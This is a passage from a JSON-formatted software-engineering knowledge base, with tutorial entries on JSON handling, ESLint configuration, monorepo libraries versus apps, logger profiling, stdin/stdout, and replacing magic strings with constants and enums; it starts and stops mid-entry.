obj = { name: 'John', password: 'secret', age: 30 };\n\nJSON.stringify(obj, (key, value) => {\n  if (key === 'password') return undefined;  // Exclude password\n  return value;\n});\n// '{\"name\":\"John\",\"age\":30}'\n```\n\n### Custom Parsing\n\n```javascript\n// Reviver function\nconst json = '{\"name\":\"John\",\"joined\":\"2024-01-19T10:30:00Z\"}';\n\nconst obj = JSON.parse(json, (key, value) => {\n  // Convert ISO strings to Date objects\n  if (key === 'joined') {\n    return new Date(value);\n  }\n  return value;\n});\n\nconsole.log(obj.joined instanceof Date);  // true\n```\n\n### Deep Clone\n\n```javascript\n// Simple deep clone (loses functions, dates become strings)\nconst original = { a: 1, b: { c: 2 } };\nconst clone = JSON.parse(JSON.stringify(original));\n\n// What gets lost:\nconst complex = {\n  date: new Date(),           // Becomes string\n  func: () => {},             // Lost\n  undefined: undefined,       // Lost\n  symbol: Symbol('id'),       // Lost\n  regex: /test/,              // Becomes {}\n};\n\nJSON.parse(JSON.stringify(complex));\n// { date: \"2024-01-19T10:30:00.000Z\", regex: {} }\n```\n\n## JSON vs Other Formats\n\n### JSON vs XML\n\n```json\n// JSON - concise\n{\n  \"user\": {\n    \"name\": \"John\",\n    \"age\": 30,\n    \"skills\": [\"JS\", \"Python\"]\n  }\n}\n```\n\n```xml\n<!-- XML - verbose -->\n<user>\n  <name>John</name>\n  <age>30</age>\n  <skills>\n    <skill>JS</skill>\n    <skill>Python</skill>\n  </skills>\n</user>\n```\n\n**JSON wins:** Smaller size, easier to parse, native JavaScript support\n\n### JSON vs YAML\n\n```json\n// JSON - stricter syntax\n{\n  \"name\": \"John\",\n  \"age\": 30,\n  \"active\": true\n}\n```\n\n```yaml\n# YAML - more readable, supports comments\nname: John\nage: 30\nactive: true\n# This is a comment\n```\n\n**Use JSON:** APIs, data exchange, strict validation\n**Use YAML:** Config files (Kubernetes, Docker Compose), human editing\n\n## Common Pitfalls\n\n```javascript\n// ❌ Trailing commas\nconst bad = '{\"name\": \"John\", \"age\": 30,}';\nJSON.parse(bad);  // Error\n\n// ❌ Single quotes\nconst bad = \"{'name': 'John'}\";\nJSON.parse(bad);  // Error\n\n// ❌ Comments\nconst bad = '{\"name\": \"John\" /* comment */}';\nJSON.parse(bad);  // Error\n\n// ❌ Undefined values\nJSON.stringify({ a: undefined });  // '{}'\nJSON.stringify({ a: null });       // '{\"a\":null}'\n\n// ❌ Circular references\nconst obj = {};\nobj.self = obj;\nJSON.stringify(obj);  // TypeError: Converting circular structure\n\n// ✅ Handle circular refs\nfunction safeStringify(obj) {\n  const seen = new WeakSet();\n  return JSON.stringify(obj, (key, value) => {\n    if (typeof value === 'object' && value !== null) {\n      if (seen.has(value)) return '[Circular]';\n      seen.add(value);\n    }\n    return value;\n  });\n}\n```\n\n## Performance Tips\n\n```javascript\n// For large objects, streaming is better\n// Node.js streams\nconst fs = require('fs');\nconst { Transform } = require('stream');\n\n// Parse large JSON file\nfs.createReadStream('large.json')\n  .pipe(JSONStream.parse('*'))  // Streaming parser\n  .on('data', (item) => {\n    processItem(item);\n  });\n\n// For browsers, use response.json()\nfetch('/api/large-data')\n  .then(res => res.json())  // Optimized parsing\n  .then(data => process(data));\n\n// Avoid repeated stringify in loops\n// ❌ Slow\nfor (let i = 0; i < 1000; i++) {\n  const json = JSON.stringify(obj);  // Stringified 1000 times\n  send(json);\n}\n\n// ✅ Fast\nconst json = JSON.stringify(obj);  // Stringified once\nfor (let i = 0; i < 1000; i++) {\n  send(json);\n}\n```\n\n## Validation\n\n```javascript\n// JSON Schema for validation\nconst schema = {\n  type: 'object',\n  properties: {\n    name: { type: 'string' },\n    age: { type: 'number', minimum: 0 },\n    email: { type: 'string', format: 'email' }\n  },\n  required: ['name', 'email']\n};\n\n// Using Ajv (validator library)\nconst Ajv = require('ajv');\nconst ajv = new Ajv();\nconst validate = ajv.compile(schema);\n\nconst data = { name: 'John', email: 'john@example.com' };\nconst valid = validate(data);\n\nif (!valid) {\n  console.log(validate.errors);\n}\n```\n\n## Security Considerations\n\n```javascript\n// ❌ Never use eval() on JSON\nconst data = eval('(' + jsonString + ')');  // Dangerous!\n\n// ✅ Always use JSON.parse\nconst data = JSON.parse(jsonString);  // Safe\n\n// Validate untrusted JSON\nfunction safeParse(text) {\n  try {\n    const obj = JSON.parse(text);\n    \n    // Validate structure\n    if (typeof obj !== 'object') throw new Error('Invalid');\n    if (obj === null) throw new Error('Invalid');\n    \n    return obj;\n  } catch (error) {\n    console.error('Invalid JSON:', error);\n    return null;\n  }\n}\n\n// Prevent prototype pollution\nconst parsed = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\n// Safe - JSON.parse doesn't execute code\n\n// But be careful with Object.assign\nObject.assign({}, parsed);  // Could pollute prototype\n```\n\n## Tools\n\n```bash\n# CLI tools\necho '{\"name\":\"John\",\"age\":30}' | jq '.name'  # Query JSON\ncat file.json | jq .  # Pretty print\n\n# Online tools\n# - jsonlint.com - Validate JSON\n# - jsonformatter.org - Format/validate\n# - json-schema-validator.herokuapp.com - Schema validation\n```\n\n## References\n\n- [JSON.org](https://www.json.org/)\n- [RFC 8259 Standard](https://www.rfc-editor.org/rfc/rfc8259)\n- [MDN: JSON](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON)\n- [JSON Schema](https://json-schema.org/)\n\n---\n\n## Summary\n\n**JSON:** Universal data format for exchanging information between systems.\n\n**Syntax:** `{\"key\": \"value\"}` - keys in double quotes, six data types (string, number, boolean, null, object, array)\n\n**Common Use:** APIs (request/response), config files, data storage, message passing\n\n**In JavaScript:**\n```javascript\nJSON.parse(string)      // String → Object\nJSON.stringify(object)  // Object → String\n```\n\n**Rule of thumb:** Use JSON for APIs and data exchange. Use YAML for human-edited configs. Always validate untrusted JSON."
    },
    {
      "id": "swe/misc/libraries/eslint",
      "title": "ESLint: Complete Overview",
      "path": [
        "swe",
        "misc",
        "libraries",
        "eslint"
      ],
      "content": "\n# ESLint: Complete Overview\n\nESLint is a JavaScript linter that analyzes code for errors, style issues, and potential bugs based on configurable rules. It catches problems like unused variables, missing semicolons, and dangerous patterns before runtime. Think of ESLint as a code reviewer that works instantly—flagging issues the moment you save a file, enforcing team standards automatically.\n\n## Key Points\n\n- **Purpose:** Find and fix JavaScript code problems automatically\n- **Configurable:** Enable/disable rules, set severity levels\n- **Fixable:** Many issues auto-fixed with `--fix` flag\n- **Extensible:** Plugins for React, TypeScript, Vue, etc.\n- **IDE Integration:** Real-time feedback in VS Code, WebStorm\n\n## Installation\n\n```bash\n# Install ESLint\nnpm install --save-dev eslint\n\n# Initialize configuration\nnpx eslint --init\n\n# Or manual install with config\nnpm install --save-dev eslint eslint-config-airbnb-base\n\n# Run ESLint\nnpx eslint src/\nnpx eslint src/ --fix  # Auto-fix issues\n```\n\n## Basic Configuration\n\n### .eslintrc.json\n\n```json\n{\n  \"env\": {\n    \"browser\": true,\n    \"es2021\": true,\n    \"node\": true\n  },\n  \"extends\": \"eslint:recommended\",\n  \"parserOptions\": {\n    \"ecmaVersion\": \"latest\",\n    \"sourceType\": \"module\"\n  },\n  \"rules\": {\n    \"semi\": [\"error\", \"always\"],\n    \"quotes\": [\"error\", \"single\"],\n    \"no-unused-vars\": \"warn\",\n    \"no-console\": \"off\"\n  }\n}\n```\n\n### Rule Severity Levels\n\n```json\n{\n  \"rules\": {\n    \"semi\": \"off\",           // 0: Disabled\n    \"quotes\": \"warn\",        // 1: Warning (doesn't fail build)\n    \"no-unused-vars\": \"error\" // 2: Error (fails build)\n  }\n}\n\n// Or with options:\n{\n  \"rules\": {\n    \"semi\": [\"error\", \"always\"],        // Require semicolons\n    \"quotes\": [\"warn\", \"single\"],       // Prefer single quotes\n    \"max-len\": [\"error\", { \"code\": 80 }] // Max line length 80\n  }\n}\n```\n\n## Common Rules\n\n### Code Quality\n\n```javascript\n// no-unused-vars\nconst unused = 5;  // ❌ Warning: 'unused' is never used\nconst used = 10;\nconsole.log(used); // ✅ OK\n\n// no-undef\nconsole.log(undefinedVar);  // ❌ Error: 'undefinedVar' is not defined\n\n// no-redeclare\nlet x = 1;\nlet x = 2;  // ❌ Error: 'x' is already declared\n\n// no-unreachable\nfunction example() {\n  return true;\n  console.log('never runs');  // ❌ Error: Unreachable code\n}\n```\n\n### Best Practices\n\n```javascript\n// eqeqeq (require === and !==)\nif (x == 5) {}   // ❌ Error: Use === instead\nif (x === 5) {}  // ✅ OK\n\n// no-var (use let/const)\nvar x = 1;    // ❌ Error: Use let or const\nlet y = 2;    // ✅ OK\nconst z = 3;  // ✅ OK\n\n// prefer-const\nlet constant = 5;  // ❌ Warning: Use const\nconst constant = 5; // ✅ OK\n\n// no-eval\neval('alert(\"bad\")');  // ❌ Error: eval is dangerous\n```\n\n### Style Rules\n\n```javascript\n// semi (semicolons)\nconst x = 5   // ❌ Error: Missing semicolon\nconst x = 5;  // ✅ OK\n\n// quotes\nconst str = \"double\";  // ❌ Error: Use single quotes\nconst str = 'single';  // ✅ OK\n\n// indent\nfunction bad() {\nif (true) {  // ❌ Error: Expected indentation of 2 spaces\nconsole.log('test');\n}\n}\n\nfunction good() {\n  if (true) {  // ✅ OK\n    console.log('test');\n  }\n}\n\n// comma-dangle\nconst obj = {\n  a: 1,\n  b: 2,  // ❌ or ✅ depending on config\n};\n```\n\n## Extending Configurations\n\n### Popular Configs\n\n```bash\n# Airbnb (strict, popular)\nnpm install --save-dev eslint-config-airbnb-base\n\n# Standard (no semicolons)\nnpm install --save-dev eslint-config-standard\n\n# Google\nnpm install --save-dev eslint-config-google\n```\n\n```json\n// .eslintrc.json\n{\n  \"extends\": [\n    \"eslint:recommended\",\n    \"airbnb-base\"\n  ],\n  \"rules\": {\n    // Override specific Airbnb rules\n    \"no-console\": \"off\"\n  }\n}\n```\n\n### Multiple Extends\n\n```json\n{\n  \"extends\": [\n    \"eslint:recommended\",    // Base ESLint rules\n    \"plugin:react/recommended\", // React rules\n    \"airbnb\",                // Airbnb style guide\n    \"prettier\"               // Disable style rules (Prettier handles)\n  ]\n}\n```\n\n## Plugins\n\n### React\n\n```bash\nnpm install --save-dev eslint-plugin-react\n```\n\n```json\n{\n  \"extends\": [\"plugin:react/recommended\"],\n  \"plugins\": [\"react\"],\n  \"rules\": {\n    \"react/prop-types\": \"warn\",\n    \"react/jsx-uses-react\": \"error\"\n  },\n  \"settings\": {\n    \"react\": {\n      \"version\": \"detect\"\n    }\n  }\n}\n```\n\n### TypeScript\n\n```bash\nnpm install --save-dev @typescript-eslint/parser @typescript-eslint/eslint-plugin\n```\n\n```json\n{\n  \"parser\": \"@typescript-eslint/parser\",\n  \"extends\": [\"plugin:@typescript-eslint/recommended\"],\n  \"plugins\": [\"@typescript-eslint\"],\n  \"rules\": {\n    \"@typescript-eslint/no-unused-vars\": \"error\",\n    \"@typescript-eslint/explicit-function-return-type\": \"off\"\n  }\n}\n```\n\n### Import Plugin\n\n```bash\nnpm install --save-dev eslint-plugin-import\n```\n\n```json\n{\n  \"plugins\": [\"import\"],\n  \"rules\": {\n    \"import/order\": [\"error\", {\n      \"groups\": [\"builtin\", \"external\", \"internal\"]\n    }],\n    \"import/no-unresolved\": \"error\"\n  }\n}\n```\n\n## Ignoring Files\n\n### .eslintignore\n\n```\n# .eslintignore (like .gitignore)\nnode_modules/\ndist/\nbuild/\n*.min.js\ncoverage/\n```\n\n### Inline Comments\n\n```javascript\n// Disable for entire file\n/* eslint-disable */\n\n// Disable specific rule for file\n/* eslint-disable no-console */\n\n// Disable for next line\n// eslint-disable-next-line no-console\nconsole.log('debug');\n\n// Disable for current line\nconsole.log('debug'); // eslint-disable-line no-console\n\n// Disable multiple rules\n// eslint-disable-next-line no-console, no-alert\nconsole.log('test');\n```\n\n## Auto-Fixing\n\n```bash\n# Fix all auto-fixable issues\nnpx eslint src/ --fix\n\n# Fix specific file\nnpx eslint src/app.js --fix\n\n# Dry run (show what would be fixed)\nnpx eslint src/ --fix-dry-run\n```\n\n```javascript\n// Auto-fixable examples:\n\n// Before\nconst x = 5\nconst str = \"double\"\n\n// After --fix\nconst x = 5;\nconst str = 'single';\n```\n\n## IDE Integration\n\n### VS Code\n\n```json\n// .vscode/settings.json\n{\n  \"editor.codeActionsOnSave\": {\n    \"source.fixAll.eslint\": true\n  },\n  \"eslint.validate\": [\n    \"javascript\",\n    \"javascriptreact\",\n    \"typescript\",\n    \"typescriptreact\"\n  ]\n}\n```\n\nInstall: ESLint extension by Microsoft\n\n### package.json Scripts\n\n```json\n{\n  \"scripts\": {\n    \"lint\": \"eslint src/\",\n    \"lint:fix\": \"eslint src/ --fix\",\n    \"lint:check\": \"eslint src/ --max-warnings 0\"\n  }\n}\n```\n\n## CI/CD Integration\n\n```yaml\n# .github/workflows/lint.yml\nname: Lint\non: [push, pull_request]\n\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - uses: actions/setup-node@v2\n      - run: npm ci\n      - run: npm run lint\n```\n\n```json\n// package.json - fail build on warnings\n{\n  \"scripts\": {\n    \"lint\": \"eslint src/ --max-warnings 0\"\n  }\n}\n```\n\n## Custom Rules\n\n### Local Rule\n\n```javascript\n// .eslint-rules/no-foo.js\nmodule.exports = {\n  meta: {\n    type: 'problem',\n    docs: {\n      description: 'Disallow use of \"foo\" variable name'\n    }\n  },\n  create(context) {\n    return {\n      Identifier(node) {\n        if (node.name === 'foo') {\n          context.report({\n            node,\n            message: 'Do not use \"foo\" as variable name'\n          });\n        }\n      }\n    };\n  }\n};\n```\n\n```json\n// .eslintrc.json\n{\n  \"rules\": {\n    \"no-foo\": \"error\"\n  }\n}\n```\n\n## Common Configurations\n\n### Basic Project\n\n```json\n{\n  \"env\": {\n    \"browser\": true,\n    \"es2021\": true\n  },\n  \"extends\": \"eslint:recommended\",\n  \"rules\": {\n    \"semi\": [\"error\", \"always\"],\n    \"quotes\": [\"error\", \"single\"],\n    \"no-unused-vars\": \"warn\"\n  }\n}\n```\n\n### React Project\n\n```json\n{\n  \"env\": {\n    \"browser\": true,\n    \"es2021\": true\n  },\n  \"extends\": [\n    \"eslint:recommended\",\n    \"plugin:react/recommended\",\n    \"plugin:react-hooks/recommended\"\n  ],\n  \"parserOptions\": {\n    \"ecmaFeatures\": { \"jsx\": true },\n    \"ecmaVersion\": \"latest\",\n    \"sourceType\": \"module\"\n  },\n  \"rules\": {\n    \"react/react-in-jsx-scope\": \"off\",\n    \"react/prop-types\": \"off\"\n  }\n}\n```\n\n### TypeScript Project\n\n```json\n{\n  \"parser\": \"@typescript-eslint/parser\",\n  \"extends\": [\n    \"eslint:recommended\",\n    \"plugin:@typescript-eslint/recommended\"\n  ],\n  \"rules\": {\n    \"@typescript-eslint/no-explicit-any\": \"warn\",\n    \"@typescript-eslint/explicit-module-boundary-types\": \"off\"\n  }\n}\n```\n\n## ESLint + Prettier\n\n```bash\n# Install Prettier and ESLint config\nnpm install --save-dev prettier eslint-config-prettier\n```\n\n```json\n// .eslintrc.json\n{\n  \"extends\": [\n    \"eslint:recommended\",\n    \"prettier\"  // Disables ESLint style rules that conflict\n  ]\n}\n```\n\n```json\n// .prettierrc\n{\n  \"semi\": true,\n  \"singleQuote\": true,\n  \"trailingComma\": \"es5\"\n}\n```\n\n## Troubleshooting\n\n```bash\n# ESLint not running\nnpx eslint --print-config src/app.js  # Show effective config\n\n# Cache issues\nnpx eslint --cache --cache-location .eslintcache src/\nrm -rf .eslintcache  # Clear cache\n\n# Debug mode\nDEBUG=eslint:* npx eslint src/\n\n# Check specific rule\nnpx eslint src/ --rule 'no-console: error'\n```\n\n## Best Practices\n\n```javascript\n// ✅ Use extends for shared configs\n{\n  \"extends\": [\"airbnb-base\", \"prettier\"]\n}\n\n// ✅ Override rules sparingly\n{\n  \"rules\": {\n    \"no-console\": \"off\"  // Only when necessary\n  }\n}\n\n// ✅ Use .eslintignore\n// Ignore generated/build files\n\n// ✅ Run in CI/CD\n// Enforce standards automatically\n\n// ✅ Auto-fix on save (IDE)\n// Catch issues immediately\n\n// ❌ Don't disable too many rules\n// Defeats purpose of linting\n\n// ❌ Don't use /* eslint-disable */ everywhere\n// Fix issues instead\n\n// ❌ Don't ignore warnings\n// Treat warnings seriously\n```\n\n## References\n\n- [ESLint Documentation](https://eslint.org/docs/latest/)\n- [ESLint Rules](https://eslint.org/docs/latest/rules/)\n- [Awesome ESLint](https://github.com/dustinspecker/awesome-eslint)\n\n---\n\n## Summary\n\n**ESLint:** JavaScript linter that catches errors and enforces code style.\n\n**Setup:**\n```bash\nnpm install --save-dev eslint\nnpx eslint --init\nnpx eslint src/ --fix\n```\n\n**Key Rules:**\n- `semi`: Semicolons\n- `quotes`: Quote style\n- `no-unused-vars`: Unused variables\n- `eqeqeq`: Strict equality\n\n**Popular Configs:**\n- `eslint:recommended`: Base rules\n- `airbnb-base`: Strict style guide\n- `prettier`: Disable style rules\n\n**Severity:**\n- `\"off\"` / `0`: Disabled\n- `\"warn\"` / `1`: Warning\n- `\"error\"` / `2`: Error\n\n**Rule of thumb:** Start with `eslint:recommended`, add project-specific rules. Run in CI/CD, integrate with IDE. Use `--fix` to auto-correct. Combine with Prettier for formatting."
    },
    {
      "id": "swe/misc/libs-vs-apps",
      "title": "Shared Libraries vs Applications in Large Monorepos",
      "path": [
        "swe",
        "misc",
        "libs-vs-apps"
      ],
      "content": "# Shared Libraries vs Applications in Large Monorepos\n\nIn large monorepos, codebases often contain both shared libraries (libs) and standalone applications (apps). Understanding the differences and best practices for managing each is crucial for maintainability, scalability, and developer productivity.\n\n## Shared Libraries (Libs)\n\n- **Purpose:** Provide reusable functionality, utilities, or components that can be consumed by multiple applications within the monorepo.\n- **Characteristics:**\n  - Decoupled from specific business logic\n  - Well-documented APIs\n  - Versioned and tested independently\n  - Minimal dependencies on applications\n- **Benefits:**\n  - Code reuse\n  - Consistency across projects\n  - Easier maintenance and bug fixes\n\n## Applications (Apps)\n\n- **Purpose:** Deliver end-user functionality, typically as deployable products or services.\n- **Characteristics:**\n  - Integrate multiple libraries\n  - Contain business logic and user interfaces\n  - Have their own deployment pipelines\n  - May depend on several shared libs\n- **Benefits:**\n  - Clear ownership and boundaries\n  - Focused on delivering value to users\n  - Can evolve independently\n\n## Key Differences\n\n| Aspect         | Shared Libraries (Libs) | Applications (Apps) |\n| -------------- | ----------------------- | ------------------- |\n| Reusability    | High                    | Low                 |\n| Business Logic | None/Minimal            | Core                |\n| Testing        | Unit/Integration        | End-to-end          |\n| Deployment     | Not deployed directly   | Deployed to users   |\n| Dependencies   | Minimal                 | Can be many         |\n\n## Best Practices in Monorepos\n\n- Clearly separate libs and apps in directory structure\n- Use automated tests for both libs and apps\n- Document APIs for shared libs\n- Manage dependencies carefully to avoid tight coupling\n- Use CI/CD pipelines to ensure quality and integration\n\n---\n\n_See journal entry for 2025-08-20 for related experience._\n"
    },
    {
      "id": "swe/misc/logging/profile-start-end",
      "title": "Logger: `profileStart` and `profileEnd` Methods",
      "path": [
        "swe",
        "misc",
        "logging",
        "profile-start-end"
      ],
      "content": "# Logger: `profileStart` and `profileEnd` Methods\n\nProfiling methods like `profileStart` and `profileEnd` (or similar, such as `console.profile`/`console.profileEnd` and `console.time`/`console.timeEnd`) are used to measure the duration of code execution, helping developers identify performance bottlenecks and optimize their applications.\n\n## Key Points\n\n- **Purpose:** Measure how long a block of code takes to execute.\n- **Usage:** Start profiling with `profileStart(label)` and end with `profileEnd(label)`.\n- **Labeling:** The same label must be used for both start and end to match the timing.\n- **Output:** The logger outputs the elapsed time or a performance profile.\n- **Debugging:** Useful for identifying slow code paths and performance regressions.\n\n## Step-by-Step Explanation & Examples\n\n1. **Using `console.profile` and `console.profileEnd` (Browser)**\n   ```js\n   console.profile('myTask');\n   // ... code to profile ...\n   console.profileEnd('myTask');\n   ```\n\n2. **Using `console.time` and `console.timeEnd` (Node.js & Browser)**\n   ```js\n   console.time('dbQuery');\n   // ... code to profile ...\n   console.timeEnd('dbQuery'); // Outputs: dbQuery: 123.45ms\n   ```\n\n3. **With a Logging Library (e.g., Winston)**\n   ```js\n   const logger = require('winston');\n   logger.profile('apiCall');\n   // ... code ...\n   logger.profile('apiCall'); // Ends and logs the duration\n   ```\n\n## Common Pitfalls\n\n- **Mismatched Labels:** If the label in `profileStart` and `profileEnd` don’t match, timing won’t work.\n- **Forgetting to End:** Not calling `profileEnd` leaves the timer open and gives no result.\n- **Overuse:** Excessive profiling can clutter logs and impact performance.\n\n## Practical Applications\n\n- Profiling database queries, API calls, or expensive computations.\n- Benchmarking different implementations.\n- Monitoring performance regressions in development.\n\n## References\n\n- [MDN: console.profile()](https://developer.mozilla.org/en-US/docs/Web/API/Console/profile)\n- [MDN: console.time()](https://developer.mozilla.org/en-US/docs/Web/API/Console/time)\n- [Winston Logger Profiling](https://github.com/winstonjs/winston#profiling)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Nested Profiling:** You can nest profiles to measure sub-tasks within a larger task.\n- **Integration with Profilers:** Some environments (like Chrome DevTools) allow you to view detailed call graphs and CPU usage for profiled code blocks.\n- **Custom Profiling Utilities:** Advanced logging libraries may offer hooks or events for integrating profiling data with monitoring dashboards or alerting"
    },
    {
      "id": "swe/misc/logging/stdin-stdout",
      "title": "Standard Input (stdin) and Standard Output (stdout): A Concise Overview",
      "path": [
        "swe",
        "misc",
        "logging",
        "stdin-stdout"
      ],
      "content": "---\n# Standard Input (stdin) and Standard Output (stdout): A Concise Overview\n\nStandard input (stdin) and standard output (stdout) are fundamental concepts in programming and operating systems, enabling programs to receive input and produce output in a consistent, stream-based way.\n\n## Key Points\n\n- **Streams:** stdin and stdout are streams for reading input and writing output.\n- **Default Devices:** By default, stdin reads from the keyboard, and stdout writes to the terminal.\n- **Redirection:** Input and output can be redirected to files or other programs.\n- **Language Support:** Most programming languages provide built-in support for stdin and stdout.\n- **Automation:** Enables scripting, automation, and chaining of commands.\n\n## Step-by-Step Explanation & Examples\n\n### 1. Reading from stdin (Node.js Example)\n```js\nprocess.stdin.on('data', (data) => {\n  console.log('You typed:', data.toString());\n});\n```\n\n### 2. Writing to stdout (Node.js Example)\n```js\nconsole.log('Hello, world!');\nprocess.stdout.write('This is standard output.\\n');\n```\n\n### 3. Shell Redirection Example\n```sh\nnode myscript.js < input.txt > output.txt\n```\n\n## Common Pitfalls\n\n- Forgetting to handle input encoding or end-of-line characters.\n- Not flushing output buffers (in some languages).\n- Blocking on stdin when no input is provided.\n\n## Practical Applications\n\n- Command-line utilities and scripts.\n- Data processing pipelines.\n- Interactive programs and REPLs.\n\n## References\n\n- [MDN: process.stdin (Node.js)](https://nodejs.org/api/process.html#processstdin)\n- [Wikipedia: Standard streams](https://en.wikipedia.org/wiki/Standard_streams)\n- [GNU Bash Manual: Redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Pipes:** Connect stdout of one process to stdin of another (e.g., `cat file.txt | grep hello`).\n- **File Descriptors:** stdin (0), stdout (1), and stderr (2) are represented by file descriptors in Unix-like systems.\n- **Non-blocking I/O:** Advanced programs may use non-blocking or asynchronous I/O for performance.\n"
    },
    {
      "id": "swe/misc/magic-strings-enums-constants",
      "title": "Magic Strings, Enums, and Constants: Complete Overview",
      "path": [
        "swe",
        "misc",
        "magic-strings-enums-constants"
      ],
      "content": "# Magic Strings, Enums, and Constants: Complete Overview\n\nMagic strings are hard-coded literal values scattered throughout code that have meaning but no clear definition. Enums and constants are solutions that replace these literals with named, reusable values. Think of magic strings like using \"$5\" everywhere in your code—you have to remember what that $5 means. Constants and enums are like naming it `SHIPPING_COST = 5`—the meaning is clear and easy to change.\n\n## Key Points\n\n- **Magic Strings:** Hard-coded literals (`\"admin\"`, `\"pending\"`) with unclear meaning\n- **Constants:** Named values that don't change (`const MAX_USERS = 100`)\n- **Enums:** Set of related named constants (user roles, order status)\n- **Problem:** Magic strings are hard to maintain, typo-prone, unclear\n- **Solution:** Replace with constants/enums for clarity and maintainability\n\n## The Problem: Magic Strings\n\n```javascript\n// ❌ Magic strings - what do these mean?\nfunction checkAccess(user) {\n  if (user.role === \"admin\") {\n    return true;\n  }\n  if (user.status === \"active\") {\n    return true;\n  }\n  return false;\n}\n\nfunction updateOrder(order) {\n  if (order.status === \"pending\") {\n    order.status = \"processing\";\n  }\n}\n\n// Problems:\n// 1. What are valid roles? (admin, user, guest?)\n// 2. What are valid statuses? (active, inactive, suspended?)\n// 3. Typo risk: \"admim\" vs \"admin\"\n// 4. Hard to change: \"admin\" appears 50 times\n// 5. No autocomplete or type checking\n```\n\n## Solution 1: Constants\n\n```javascript\n// ✅ Constants - clear and maintainable\nconst USER_ROLE_ADMIN = \"admin\";\nconst USER_ROLE_USER = \"user\";\nconst USER_ROLE_GUEST = \"guest\";\n\nconst USER_STATUS_ACTIVE = \"active\";\nconst USER_STATUS_INACTIVE = \"inactive\";\n\nconst ORDER_STATUS_PENDING = \"pending\";\nconst ORDER_STATUS_PROCESSING = \"processing\";\nconst ORDER_STATUS_SHIPPED = \"shipped\";\n\nfunction checkAccess(user) {\n  if (user.role === USER_ROLE_ADMIN) {\n    return true;\n  }\n  if (user.status === USER_STATUS_ACTIVE) {\n    return true;\n  }\n  return false;\n}\n\n// Benefits:\n// 1. Clear what values are valid\n// 2. Typos caught at runtime (undefined variable)\n// 3. Change once, affects everywhere\n// 4. Autocomplete helps\n```\n\n## Solution 2: Object Constants\n\n```javascript\n// Group related constants\nconst USER_ROLES = {\n  ADMIN: \"admin\",\n  USER: \"user\",\n  GUEST: \"guest\"\n};\n\nconst USER_STATUS = {\n  ACTIVE: \"active\",\n  INACTIVE: \"inactive\",\n  SUSPENDED: \"suspended\"\n};\n\nconst ORDER_STATUS = {\n  PENDING: \"pending\",\n  PROCESSING: \"processing\",\n  SHIPPED: \"shipped\",\n  DELIVERED: \"delivered\"\n};\n\n// Usage\nfunction checkAccess(user) {\n  if (user.role === USER_ROLES.ADMIN) {\n    return true;\n  }\n  return false;\n}\n\n// Get all possible values\nObject.values(ORDER_STATUS);  // [\"pending\", \"processing\", ...]\n```\n\n## Solution 3: Enums (TypeScript)\n\n```typescript\n// TypeScript enum\nenum UserRole {\n  ADMIN = \"admin\",\n  USER = \"user\",\n  GUEST = \"guest\"\n}\n\nenum OrderStatus {\n  PENDING = \"pending\",\n  PROCESSING = \"processing\",\n  SHIPPED = \"shipped\",\n  DELIVERED = \"delivered\"\n}\n\n// Type-safe usage\nfunction checkAccess(user: { role: UserRole }): boolean {\n  if (user.role === UserRole.ADMIN) {\n    return true;\n  }\n  return false;\n}\n\n// ✅ Type checking\ncheckAccess({ role: UserRole.ADMIN });  // Works\ncheckAccess({ role: \"invalid\" });        // ❌ Type error\n\n// Get values\nObject.values(OrderStatus);\n// [\"pending\", \"processing\", \"shipped\", \"delivered\"]\n```\n\n## Real-World Examples\n\n### HTTP Status Codes\n\n```javascript\n// ❌ Magic numbers\nif (response.status === 200) {\n  // success\n}\nif (response.status === 404) {\n  // not found\n}\n\n// ✅ Constants\nconst HTTP_STATUS = {\n  OK: 200,\n  CREATED: 201,\n  BAD_REQUEST: 400,\n  UNAUTHORIZED: 401,\n  NOT_FOUND: 404,\n  SERVER_ERROR: 500\n};\n\nif (response.status === HTTP_STATUS.OK) {\n  // success\n}\nif (response.status === HTTP_STATUS.NOT_FOUND) {\n  // not found\n}\n```\n\n### API Endpoints\n\n```javascript\n// ❌ Magic strings\nfetch(\"/api/users\");\nfetch(\"/api/users/123\");\nfetch(\"/api/orders\");\n\n// ✅ Constants\nconst API_ENDPOINTS = {\n  USERS: \"/api/users\",\n  USER_BY_ID: (id) => `/api/users/${id}`,\n  ORDERS: \"/api/orders\",\n  ORDER_BY_ID: (id) => `/api/orders/${id}`\n};\n\nfetch(API_ENDPOINTS.USERS);\nfetch(API_ENDPOINTS.USER_BY_ID(123));\n```\n\n### Configuration\n\n```javascript\n// ❌ Magic values\nsetTimeout(() => {}, 5000);\nconst users = data.slice(0, 10);\nif (password.length < 8) {\n  // error\n}\n\n// ✅ Named constants\nconst TIMEOUTS = {\n  API_RETRY: 5000,\n  DEBOUNCE: 300,\n  POLL_INTERVAL: 1000\n};\n\nconst PAGINATION = {\n  DEFAULT_PAGE_SIZE: 10,\n  MAX_PAGE_SIZE: 100\n};\n\nconst VALIDATION = {\n  MIN_PASSWORD_LENGTH: 8,\n  MAX_USERNAME_LENGTH: 20\n};\n\nsetTimeout(() => {}, TIMEOUTS.API_RETRY);\nconst users = data.slice(0, PAGINATION.DEFAULT_PAGE_SIZE);\nif (password.length < VALIDATION.MIN_PASSWORD_LENGTH) {\n  // error\n}\n```\n\n### Event Types\n\n```javascript\n// ❌ Magic strings\nbutton.addEventListener(\"click\", handler);\neventBus.emit(\"user:login\");\neventBus.emit(\"order:created\");\n\n// ✅ Constants\nconst EVENTS = {\n  USER_LOGIN: \"user:login\",\n  USER_LOGOUT: \"user:logout\",\n  ORDER_CREATED: \"order:created\",\n  ORDER_UPDATED: \"order:updated\"\n};\n\nbutton.addEventListener(\"click\", handler);  // DOM events stay as-is\neventBus.emit(EVENTS.USER_LOGIN);\neventBus.emit(EVENTS.ORDER_CREATED);\n```\n\n## TypeScript Enum Patterns\n\n### String Enums\n\n```typescript\nenum OrderStatus {\n  PENDING = \"pending\",\n  PROCESSING = \"processing\",\n  SHIPPED = \"shipped\",\n  DELIVERED = \"delivered\"\n}\n\n// Use as type\nfunction updateOrder(orderId: string, status: OrderStatus) {\n  // status must be one of the enum values\n}\n\nupdateOrder(\"123\", OrderStatus.SHIPPED);  // ✅\nupdateOrder(\"123\", \"invalid\");            // ❌ Type error\n```\n\n### 